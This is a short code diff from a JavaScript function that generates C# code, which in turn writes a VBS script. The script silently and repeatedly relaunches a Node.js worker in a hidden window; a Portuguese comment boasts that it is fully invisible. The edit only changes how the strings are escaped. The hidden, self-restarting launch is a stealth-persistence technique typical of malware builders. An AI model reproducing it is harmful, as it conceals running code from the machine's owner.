@@ -111,9 +111,9 @@ function buildCsCode(url, key, guild) {
     lines.push('            // Cria VBS 100% invisivel sem cmd.exe ou loop.bat');
     lines.push('            var vbs = new StringBuilder();');
     lines.push('            vbs.AppendLine("Set WshShell = CreateObject(\\"WScript.Shell\\")");');
-    lines.push('            vbs.AppendLine("WshShell.CurrentDirectory = \\"" + workerPath.Replace("\\", "\\\\") + "\\"");');
+    lines.push('            vbs.AppendLine(string.Format("WshShell.CurrentDirectory = \\"{0}\\"", workerPath));');
     lines.push('            vbs.AppendLine("Do");');
-    lines.push('            vbs.AppendLine("    returnVal = WshShell.Run(\\"\\\"\\"" + nodePath.Replace("\\", "\\\\") + "\\\"\\\" \\\"\\\"" + indexJs.Replace("\\", "\\\\") + "\\\"\\\"\\", 0, True)");');
+    lines.push('            vbs.AppendLine(string.Format("    returnVal = WshShell.Run(\\"\\"\\"{0}\\"\\" \\"\\"{1}\\"\\"\\", 0, True)", nodePath, indexJs));');
     lines.push('            vbs.AppendLine("    WScript.Sleep 5000");');
     lines.push('            vbs.AppendLine("Loop");');
     lines.push('            File.WriteAllText(vbsPath, vbs.ToString());');
